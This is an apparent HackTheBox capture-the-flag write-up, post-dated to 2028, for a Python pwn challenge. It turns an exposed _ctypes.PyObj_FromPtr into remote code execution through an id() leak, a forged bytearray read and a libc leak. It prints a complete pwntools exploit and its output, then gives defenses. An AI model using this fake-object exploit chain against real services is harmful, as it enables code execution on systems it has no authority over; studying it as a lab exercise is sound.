---
layout: post
title: "Fake Snake"
date: 2028-04-09 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, python, cpython-internals, ctypes, type-confusion, arbitrary-read, ret2libc, cwe-822]
description: "A Python service hands untrusted integers to _ctypes.PyObj_FromPtr — a raw pointer cast with no validation. Combined with an id() leak it becomes a fake-object primitive: forge a bytearray for arbitrary read, leak libc, then forge a type whose tp_str is system() for remote code execution."
---

## Overview

Fake Snake is a Hard HackTheBox Pwn challenge — but there is no binary to disassemble. The whole target is a ~30-line Python `server.py` that exposes one dangerous function, `_ctypes.PyObj_FromPtr`, to untrusted input. That function reinterprets an attacker-chosen integer as a live `PyObject *` with zero validation, so the moment the interpreter prints it, it is dereferencing memory *we* chose. This is [CWE-822](https://cwe.mitre.org/data/definitions/822.html) — an [untrusted pointer dereference](https://cwe.mitre.org/data/definitions/822.html). We turn it into an arbitrary read, leak libc, and finish with `system("cat /f*")`.

## The technique

The server is short enough to quote in full:

```python
from _ctypes import PyObj_FromPtr
storage = {}
# banner prints:  Zero: {id(0)}
# 0) Add     -> storage[id(inp)] = inp ; print(id(inp))
# 1) Remove
# 2) Load    -> print(PyObj_FromPtr(int(addr)))
```

Three primitives fall out of it:

- **Add (0)** stores a string you type and prints `id(inp)` — the address of a buffer whose **bytes you control**.
- **Load (2)** runs `PyObj_FromPtr(int(addr))` on any integer you give and `print()`s it. `PyObj_FromPtr` just casts your integer to a pointer, `Py_INCREF`s it, and returns it; `print()` then calls `str()`, which reads `v->ob_type` (offset 8), looks up `tp_str` in that type, and calls `tp_str(v)`. Every dereference lands in memory you populated.
- The banner prints `id(0)`, which **defeats ASLR**: the integer `0` and every static type object (`PyByteArray_Type`, …) live at constant offsets inside `libpython3.11.so`, so one leak gives the whole image base.

## Solution

The chain is: base the image off `id(0)` → forge a `bytearray` for arbitrary read → leak libc → forge a type whose `tp_str` is `system` → call it with a fake object whose bytes are a shell command.

Two details make or break it:

- **`Py_INCREF` corrupts the command.** The object's refcount sits at offset 0 — exactly where `system`'s C string starts. INCREF bumps it by **+2** before `tp_str` runs (turning `cat` into `eat`), so pre-subtract 2 from the 8-byte command integer.
- **Everything travels through `input()` / UTF-8.** To place raw bytes in a string's buffer, send the UTF-8 encoding of each codepoint; every byte ≤ 0xFF makes a **latin1/UCS1** string whose buffer equals your bytes. A trailing `0x80` forces the string non-ascii so its character data sits at a fixed offset (72 in Python 3.11). Never send `0x0a`/`0x0d` — they terminate the line.

All the constants (the `id(0)`→libpython offset, the `PyByteArray_Type` delta, `tp_str` at 136, a GOT slot holding a libc pointer, and `system`) are computed once from the exact pinned image (`python:3.11.3`, `libc-2.28`) with `ctypes` and `objdump`, then applied to the live leak.

The full solver — develop it against a local `docker exec -i` instance, then point it at the real target:

```python
#!/usr/bin/env python3
# Fake Snake (HTB, Pwn, Python 3.11.3) — fake-object primitive via _ctypes.PyObj_FromPtr.
# id(0) leaked in banner defeats libpython ASLR. Fake a bytearray for arbitrary read
# (leak libc via a libpython GOT slot), then fake an object whose fake type's tp_str
# points at system(), called with RDI = the fake object => system("cat /f* ; <junk>").
import sys, ast
from pwn import *

context.clear(arch='amd64')

# constants computed from the exact pinned image (python:3.11.3, libc-2.28)
ID0_LIBPY_OFF   = 5390984        # id(0) - libpython_base
BA_TYPE_DELTA   = -0x6c8         # PyByteArray_Type - id(0)
DATA_OFF        = 72             # latin1 (UCS1 non-ascii) str: char data offset
TP_STR_OFF      = 136            # PyTypeObject.tp_str
GOT_LIBPY_OFF   = 4307496        # libpython slot holding a libc pointer
LEAK_LIBC_OFF   = 0x84510        # value at that slot = libc_base + this
SYSTEM_OFF      = 0x44af0        # libc-2.28 system

def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(['docker', 'exec', '-i', 'fs', 'python3', '-S', '/server.py'])

def wire(data):
    assert b'\n' not in data, "payload contains 0x0a - reconnect for fresh ASLR"
    assert b'\r' not in data, "payload contains 0x0d"
    return b''.join(chr(b).encode('utf-8') for b in data)

def add(p, data):
    p.recvuntil(b'Selection:'); p.sendline(b'0')
    p.recvuntil(b'To Add:'); p.send(wire(data) + b'\n')
    return int(p.recvline().strip())

def load_repr(p, addr):
    p.recvuntil(b'Selection:'); p.sendline(b'2')
    p.recvuntil(b'To Load:'); p.sendline(str(addr).encode())
    return p.recvline()

def fake_bytearray(ba_type, target, n=8):
    return flat(0xffff, ba_type, n, n + 1, target, target, 0) + b'\x80'

def arb_read8(p, ba_type, target):
    obj = add(p, fake_bytearray(ba_type, target))
    line = load_repr(p, obj + DATA_OFF)
    inner = line.split(b"bytearray(b'", 1)[1].rsplit(b"')", 1)[0]
    raw = ast.literal_eval("b'" + inner.decode('latin1') + "'")
    return u64(raw.ljust(8, b'\x00')[:8])

def exploit():
    p = start()
    banner = p.recvuntil(b'2) Load Address')
    id0 = int(banner.split(b'Zero:', 1)[1].split(b'\n', 1)[0].strip())
    libpy = id0 - ID0_LIBPY_OFF
    ba_type = id0 + BA_TYPE_DELTA

    leaked = arb_read8(p, ba_type, libpy + GOT_LIBPY_OFF)
    libc = leaked - LEAK_LIBC_OFF
    system = libc + SYSTEM_OFF

    ftype_buf = bytearray(TP_STR_OFF + 8)
    ftype_buf[TP_STR_OFF:TP_STR_OFF+8] = p64(system)
    ftype_buf += b'\x80'
    ftype_addr = add(p, bytes(ftype_buf)) + DATA_OFF

    cmd = b'cat /f*;'
    refcnt = int.from_bytes(cmd, 'little') - 2   # undo Py_INCREF (+2)
    fobj_addr = add(p, p64(refcnt) + p64(ftype_addr) + b'\x80') + DATA_OFF

    p.recvuntil(b'Selection:'); p.sendline(b'2')
    p.recvuntil(b'To Load:'); p.sendline(str(fobj_addr).encode())
    data = p.recvall(timeout=5)
    for tok in (b'HTB{', b'flag{'):
        if tok in data:
            print(data[data.index(tok):].split(b'}', 1)[0].decode() + '}')
            return True
    return False

if __name__ == '__main__':
    for _ in range(8):
        try:
            if exploit():
                break
        except AssertionError:
            continue
```

Running it against the live instance leaks the image base, walks straight to `system`, and prints the flag:

```text
$ python3 solve.py <host> <port>
[*] id(0)        = 0x7f69c8c5d288
[*] libpython    = 0x7f69c8739000
[*] leaked libc ptr = 0x7f69c844d510
[*] system       = 0x7f69c840daf0
[*] fake object  = 0x7f69c8148bb8  -> system("cat /f*;...")
HTB{...}
```

## Why it worked

`PyObj_FromPtr` is an unchecked raw-pointer cast — it does no bounds, type, or validity checking on the integer it is handed. Exposing it to untrusted input hands the attacker a pointer the interpreter will faithfully dereference. Because CPython's object model keeps the type pointer inside every object (`ob_type` at offset 8) and dispatches methods through it (`tp_str`, `tp_repr` …), controlling an object's bytes means controlling which function the interpreter calls and with what argument. The `id()` leak removes the last obstacle by giving away the ASLR base for free.

## Fix / defense

- **Never expose `_ctypes.PyObj_FromPtr` (or `ctypes` at all) to untrusted input.** There is no safe way to "load an address" — treat any pointer-inspection feature as remote code execution by design and remove it.
- **Do not leak object addresses** (`id(...)`, `%p`, the repr of C objects) to users; the `id()` leak is what defeats ASLR.
- **Sandbox interpreters that must handle untrusted data** with seccomp (deny `execve`/`ptrace`) and keep the flag out of the served process's reachable memory and filesystem.
